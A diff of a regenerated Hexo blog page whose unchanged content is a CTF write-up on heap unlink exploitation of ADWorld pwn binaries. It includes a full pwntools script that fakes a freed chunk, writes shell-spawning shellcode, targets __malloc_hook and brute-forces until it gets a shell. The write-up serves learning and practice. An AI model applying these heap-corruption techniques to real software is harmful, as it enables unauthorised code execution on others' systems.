@@ -35,10 +35,10 @@
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"}
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/img/wang.svg","avatar":"/img/aliwangwang.svg","first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":true},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Gamer","Learner"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"version":"3.8.5"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2018,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
-    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
   </script>
 <meta name="generator" content="Hexo 5.4.2"></head>
 
@@ -46,13 +46,15 @@
 <body>
 <div class="progress-bar-container">
     
+        <span class="scroll-progress-bar"></span>
+    
 
     
 </div>
 
 
-<main class="page-container border-box">
 
+<main class="page-container border-box">
     <!-- home first screen  -->
     
 
@@ -78,49 +80,59 @@
             <div class="pc">
                 <ul class="menu-list">
                     
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/"
                             >
+                                
                                 HOME
                             </a>
                         </li>
                     
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/archives"
                             >
+                                
                                 ARCHIVES
                             </a>
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
-                                CATEGORIES
-                            </a>
-                        </li>
-                    
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/tags"
                             >
+                                
                                 TAGS
                             </a>
                         </li>
                     
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/about"
                             >
+                                
                                 ABOUT
                             </a>
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas fa-search"></i>
+                            <i class="fas search fa-search"></i>
                         </li>
                     
                 </ul>
@@ -139,29 +151,39 @@
     <div class="header-drawer">
         <ul class="drawer-menu-list">
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/">HOME</a>
+                       href="/"
+                    >HOME</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/archives">ARCHIVES</a>
+                       href="/archives"
+                    >ARCHIVES</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/categories">CATEGORIES</a>
+                       href="/tags"
+                    >TAGS</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/tags">TAGS</a>
+                       href="/categories"
+                    >CATEGORIES</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/about">ABOUT</a>
+                       href="/about"
+                    >ABOUT</a>
                 </li>
             
         </ul>
@@ -177,61 +199,57 @@
         <div class="page-main-content-middle border-box">
 
             <div class="main-content border-box">
-
                 
 
-                    <div class="fade-in-down-animation">
+                    
+<div class="fade-in-down-animation">
     <div class="post-page-container border-box">
-
-        <div class="article-content-container border-box">
-
+        <div class="post-content-container border-box">
             
 
-            <div class="article-content-bottom border-box">
+            <div class="post-content-bottom border-box">
                 
-                    <div class="article-title">
+                    <div class="post-title">
                         ADWorld PWN Challenge Area Write-ups (Unlink)
                     </div>
                 
 
                 
-                    <div class="article-header border-box">
+                    <div class="post-header border-box">
                         
                             <div class="avatar-box border-box">
                                 <img src="/img/aliwangwang.svg">
                             </div>
                         
                         <div class="info-box">
-                            <div class="author">
+                            <div class="author border-box">
                                 <span class="name">TyeYeah</span>
                                 
-                                    <span class="author-label">Lv4</span>
+                                    <span class="author-badge">Lv4</span>
                                 
                             </div>
                             <div class="meta-info border-box">
                                 
 
-<div class="article-meta-info-container border-box post">
-    <div class="article-meta-info border-box">
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
         
 
-
         
-            <span class="meta-info-item article-create-date">
-                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
-                <span class="pc">2020-09-20 18:54:52</span>
-                <span class="mobile">2020-09-20 18:54</span>
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2020-09-20 18:54:52</span>
             </span>
 
-            <span class="meta-info-item article-update-date">
+            <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="pc" data-updated="Wed Oct 14 2020 20:08:06 GMT+0800">2020-10-14 20:08:06</span>
+                <span class="datetime" data-updated="Wed Oct 14 2020 20:08:06 GMT+0800">2020-10-14 20:08:06</span>
             </span>
         
 
         
-            <span class="meta-info-item article-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
-                <ul class="article-category-ul">
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
                     
                             <li class="category-item"><a href="/categories/CTF/">CTF</a></li>
                         
@@ -241,9 +259,8 @@
         
 
         
-            <span class="article-tag meta-info-item border-box">
-                <i class="icon fas fa-tags"></i>&nbsp;
-                <ul class="article-tag-ul">
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
                     
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pwn/">pwn</a></li>
                         
@@ -269,12 +286,12 @@
 
         
         
-            <span class="meta-info-item article-wordcount">
+            <span class="meta-info-item post-wordcount">
                 <i class="icon fas fa-file-word"></i>&nbsp;<span>3.5k Words</span>
             </span>
         
         
-            <span class="meta-info-item article-min2read">
+            <span class="meta-info-item post-min2read">
                 <i class="icon fas fa-clock"></i>&nbsp;<span>21 Mins</span>
             </span>
         
@@ -289,7 +306,7 @@
                     </div>
                 
 
-                <div class="article-content keep-markdown-body">
+                <div class="post-content keep-markdown-body">
                     
 
                     <h2 id="4-ReeHY-main-100"><a href="#4-ReeHY-main-100" class="headerlink" title="4-ReeHY-main-100"></a>4-ReeHY-main-100</h2><p>Attachment: <a href="/filehost/apcaw/4-ReeHY-main-100.zip">4-ReeHY-main-100.zip</a><br>Description: None</p>
@@ -318,15 +335,15 @@
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size_list = (__int64)<span class="built_in">malloc</span>(<span class="number">0x14</span>uLL);</span><br></pre></td></tr></table></figure>
 <p>In <code>create()</code>:</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)(size_list + <span class="number">4LL</span> * v3) = nbytes;</span><br><span class="line">*((_QWORD *)&amp;content_list + <span class="number">2</span> * v3) = dest;</span><br><span class="line">exist_flag[<span class="number">4</span> * v3] = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
-<p>According to their addresses we know that <code>size_list</code> is a <code>0x14</code> array to store content size.<br>The <code>content_list</code> and <code>exist_flag</code> can be regarded as a structure which is <code>0x10</code> long, <code>0x8</code> for <code>content_list</code> which stores pointer of <code>content</code>, and the rest for <code>exist_flag</code> which stores <code>content</code> size.<br><img src="/imghost/apcaw/u1.svg" alt="u1.svg"></p>
+<p>According to their addresses we know that <code>size_list</code> is a <code>0x14</code> array to store content size.<br>The <code>content_list</code> and <code>exist_flag</code> can be regarded as a structure which is <code>0x10</code> long, <code>0x8</code> for <code>content_list</code> which stores pointer of <code>content</code>, and the rest for <code>exist_flag</code> which stores <code>content</code> size.<br><img   src="/imghost/apcaw/u1.svg"  alt="u1.svg"></p>
 <p>We can hijack <code>GOT</code> to leak <code>libc</code> base address and get shell, the point is how to edit <code>GOT</code> items.<br>The <code>edit()</code> is to edit what <code>content_list</code> items point to, so we try <code>unlink</code> to change what they point as <code>GOT</code> items.</p>
-<p>First we create 2 chunks with index <code>0</code> and <code>1</code><br><img src="/imghost/apcaw/u2.svg" alt="u2.svg"></p>
+<p>First we create 2 chunks with index <code>0</code> and <code>1</code><br><img   src="/imghost/apcaw/u2.svg"  alt="u2.svg"></p>
 <p>Then we fake a freed chunk in chunk <code>0</code> waiting for <code>unlink</code>. </p>
 <p>To set it as freed, the <code>prev_size</code> of chunk <code>1</code> should be the faked chunk’s size, but the size of chunk <code>0</code> in <code>size_list</code> cannot let us overflow <code>prev_size</code> of chunk <code>1</code>. So we have to edit <code>size_list</code> first.</p>
 <p>In <code>create()</code> the <code>cun</code> can be negative, which leads us to access things ahead of <code>content_list</code>, so do <code>delete()</code>. If we set index as <code>-2</code> we will access <code>size_list</code>. </p>
-<p>One way is to <code>delete()</code> the <code>size_list</code> first to put it in fastbin (it is <code>0x14</code>), then <code>create()</code> a chunk <code>2</code> in <code>0x10-0x18</code> to get that back into control and edit.<br><img src="/imghost/apcaw/u3.svg" alt="u3.svg"><br>Another way is to <code>create()</code> with index <code>-2</code>, which <code>malloc</code> a new controllable space for <code>size_list</code>, but remember to set <code>content</code> size of others right.<br><img src="/imghost/apcaw/u4.svg" alt="u4.svg"></p>
-<p>Anyway we control the <code>size_list</code>, and it’s easy to set chunk <code>0</code> big enough to enable faking chunk. Let’s fake one:<br><img src="/imghost/apcaw/u5.svg" alt="u5.svg"><br>Things in red is our fake chunk, and we overflow <code>prev_size</code> and <code>prev_inuse</code> in <code>size</code> of chunk <code>1</code> to indicate that this chunk is freed, ready to <code>unlink</code>.</p>
-<p>Then we free chunk <code>1</code>, which <code>unlink</code> fake chunk and get <code>*content_list = content_list-0x18</code>.<br><img src="/imghost/apcaw/u6.svg" alt="u6.svg"><br>It sometimes is confusing because we do not know clearly how to exploit it. Well, here we can overflow <code>content_list</code> items as <code>GOT</code> items and set all <code>exist_flag</code> as <code>1</code>, then use <code>edit()</code> to hijack <code>GOT</code>. </p>
+<p>One way is to <code>delete()</code> the <code>size_list</code> first to put it in fastbin (it is <code>0x14</code>), then <code>create()</code> a chunk <code>2</code> in <code>0x10-0x18</code> to get that back into control and edit.<br><img   src="/imghost/apcaw/u3.svg"  alt="u3.svg"><br>Another way is to <code>create()</code> with index <code>-2</code>, which <code>malloc</code> a new controllable space for <code>size_list</code>, but remember to set <code>content</code> size of others right.<br><img   src="/imghost/apcaw/u4.svg"  alt="u4.svg"></p>
+<p>Anyway we control the <code>size_list</code>, and it’s easy to set chunk <code>0</code> big enough to enable faking chunk. Let’s fake one:<br><img   src="/imghost/apcaw/u5.svg"  alt="u5.svg"><br>Things in red is our fake chunk, and we overflow <code>prev_size</code> and <code>prev_inuse</code> in <code>size</code> of chunk <code>1</code> to indicate that this chunk is freed, ready to <code>unlink</code>.</p>
+<p>Then we free chunk <code>1</code>, which <code>unlink</code> fake chunk and get <code>*content_list = content_list-0x18</code>.<br><img   src="/imghost/apcaw/u6.svg"  alt="u6.svg"><br>It sometimes is confusing because we do not know clearly how to exploit it. Well, here we can overflow <code>content_list</code> items as <code>GOT</code> items and set all <code>exist_flag</code> as <code>1</code>, then use <code>edit()</code> to hijack <code>GOT</code>. </p>
 <p>Check the exploit script for details.</p>
 <p>Besides there is also a <code>stackoverflow</code> in <code>create()</code>. it reads <code>size</code> and use it as <code>signed int</code> to <code>malloc</code>, while as <code>unsigned int</code> to <code>read</code>, so here exists a integer overflow.</p>
 <p>Set <code>size</code> as ‘-1’ and in <code>read</code> it will read <code>0xffffffff</code> chars to <code>buf</code> on stack. But there is a <code>memcpy(dest, &amp;buf, (signed int)nbytes);</code> to execute, so when overflow we have to set their value (<code>dest</code>, <code>buf</code>, <code>nbytes</code>) right.</p>
@@ -379,7 +396,6 @@ We <code>malloc</code> chunk in that <code>fastbin</code> list to alloc <code>0x
 <h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>Here it is:</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;timu&#x27;</span>)</span><br><span class="line"><span class="comment"># sh = remote(&#x27;220.249.52.133&#x27;,&#x27;56588&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;timu&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss() <span class="comment"># &#x27;0x601020&#x27;</span></span><br><span class="line">buf_addr = <span class="number">0x601040</span></span><br><span class="line">malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">exploit_addr = (malloc_hook &amp; <span class="number">0xffff</span>) - <span class="number">0x23</span> <span class="comment"># need to explain</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Data:&#x27;</span>,data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Data:&#x27;</span>,data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span>():</span></span><br><span class="line">    create(<span class="number">0x100</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># chunk 0</span></span><br><span class="line">    create(<span class="number">0x100</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># chunk 1</span></span><br><span class="line">    payload1 = p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(buf_addr-<span class="number">0x18</span>)+p64(buf_addr-<span class="number">0x10</span>)</span><br><span class="line">    payload1 += <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x100</span>-<span class="number">4</span>*<span class="number">8</span>) </span><br><span class="line">    payload1 += p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>) </span><br><span class="line">    update(<span class="number">0</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line">    delete(<span class="number">1</span>) <span class="comment"># unlink, now buf[0] -&gt; buf_addr - 0x18</span></span><br><span class="line"></span><br><span class="line">    payload2 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(bss_addr)</span><br><span class="line">    update(<span class="number">0</span>,<span class="built_in">len</span>(payload2),payload2) <span class="comment"># set buf[0] -&gt; bss</span></span><br><span class="line">    update(<span class="number">0</span>,<span class="built_in">len</span>(shellcode),shellcode) <span class="comment"># write shellcode to bss</span></span><br><span class="line"></span><br><span class="line">    create(<span class="number">0x10</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># chunk 2</span></span><br><span class="line">    create(<span class="number">0x80</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># chunk 3</span></span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># chunk 4</span></span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;5&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># chunk 5</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">3</span>) <span class="comment"># to unsorted bin, leave &#x27;main_arena + 0x88&#x27; in fd</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># this part is for debug</span></span><br><span class="line">    <span class="comment"># delete(4)</span></span><br><span class="line">    <span class="comment"># print pidof(sh)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    create(<span class="number">0x80</span>,p16(exploit_addr)) <span class="comment"># chunk 6 (3) # partial write &#x27;fd&#x27; to be &#x27;malloc_hook - 0x23&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload3 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">    update(<span class="number">2</span>,<span class="built_in">len</span>(payload3),payload3)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># this part is also for debug</span></span><br><span class="line">    <span class="comment"># print pidof(sh)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    update(<span class="number">5</span>,<span class="number">1</span>,p8(<span class="number">0x30</span>)) <span class="comment"># partial write &#x27;fd&#x27; of chunk 5 to point to chunk 3</span></span><br><span class="line"></span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;7&#x27;</span>*<span class="number">8</span>) <span class="comment"># chunk 7 (5)</span></span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;8&#x27;</span>*<span class="number">8</span>) <span class="comment"># chunk 8 (3)</span></span><br><span class="line">    <span class="comment"># create(0x65,&#x27;xxx&#x27;) # &#x27;size&#x27; must be 0x58-0x68, corresponding to 0x7f</span></span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(bss_addr)) <span class="comment"># chunk 8 (__malloc_hook - 0x23)</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># crack()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># brute force</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    sh = process(<span class="string">&#x27;timu&#x27;</span>)</span><br><span class="line">    <span class="comment"># sh = remote(&#x27;220.249.52.133&#x27;,&#x27;56588&#x27;)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Round:&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">        crack()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sh.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
                 </div>
-
                 
 
                 <div class="post-bottom-tags-and-share border-box">
@@ -422,18 +438,18 @@ We <code>malloc</code> chunk in that <code>fastbin</code> list to alloc <code>0x
                 
 
                 
-                    <div class="article-nav">
+                    <div class="post-nav border-box">
                         
-                            <div class="article-prev">
+                            <div class="prev-post">
                                 <a class="prev"
                                    rel="prev"
                                    href="/2020/10/02/2020-10-02-A-Brief-History-of-Fuzzing/"
                                    title="A Brief History of Fuzzing"
                                 >
                                     <span class="left arrow-icon flex-center">
-                                      <i class="fas fa-chevron-left"></i>
+                                        <i class="fas fa-chevron-left"></i>
                                     </span>
-                                            <span class="title flex-center">
+                                    <span class="title flex-center">
                                         <span class="post-nav-title-item text-ellipsis">A Brief History of Fuzzing</span>
                                         <span class="post-nav-item">Prev posts</span>
                                     </span>
@@ -441,7 +457,7 @@ We <code>malloc</code> chunk in that <code>fastbin</code> list to alloc <code>0x
                             </div>
                         
                         
-                            <div class="article-next">
+                            <div class="next-post">
                                 <a class="next"
                                    rel="next"
                                    href="/2020/08/29/2020-08-29-ADWorld-PWN-Challenge-Area-Write-ups-GOT-Hijacking/"
@@ -451,8 +467,8 @@ We <code>malloc</code> chunk in that <code>fastbin</code> list to alloc <code>0x
                                         <span class="post-nav-title-item text-ellipsis">ADWorld PWN Challenge Area Write-ups (GOT Hijacking)</span>
                                         <span class="post-nav-item">Next posts</span>
                                     </span>
-                                            <span class="right arrow-icon flex-center">
-                                      <i class="fas fa-chevron-right"></i>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
                                     </span>
                                 </a>
                             </div>
@@ -488,7 +504,6 @@ We <code>malloc</code> chunk in that <code>fastbin</code> list to alloc <code>0x
 
                 
             </div>
-
         </div>
 
         <div class="page-main-content-bottom border-box">
@@ -544,6 +559,11 @@ We <code>malloc</code> chunk in that <code>fastbin</code> list to alloc <code>0x
 
         <!-- PC go comment -->
         
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
     </ul>
 </div>
 
@@ -562,7 +582,7 @@ We <code>malloc</code> chunk in that <code>fastbin</code> list to alloc <code>0x
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-dark-light-toggle flex-center">
+        <li class="tools-item tool-toggle-theme-mode flex-center">
             <i class="fas fa-moon"></i>
         </li>
 
@@ -659,7 +679,9 @@ We <code>malloc</code> chunk in that <code>fastbin</code> list to alloc <code>0x
 
 <script src="/js/back2top.js"></script>
 
-<script src="/js/dark-light-toggle.js"></script>
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
 
 <script src="/js/main.js"></script>
 
@@ -670,13 +692,6 @@ We <code>malloc</code> chunk in that <code>fastbin</code> list to alloc <code>0x
 
     
 <script src="/js/local-search.js"></script>
-
-
-
-<!-- code-block -->
-
-    
-<script src="/js/code-block.js"></script>
 
 
 
@@ -704,10 +719,16 @@ We <code>malloc</code> chunk in that <code>fastbin</code> list to alloc <code>0x
         
     
 
-    <!-- category-page -->
+    <!-- categories page -->
     
 
-    <!-- links-page -->
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
     
 </div>
 
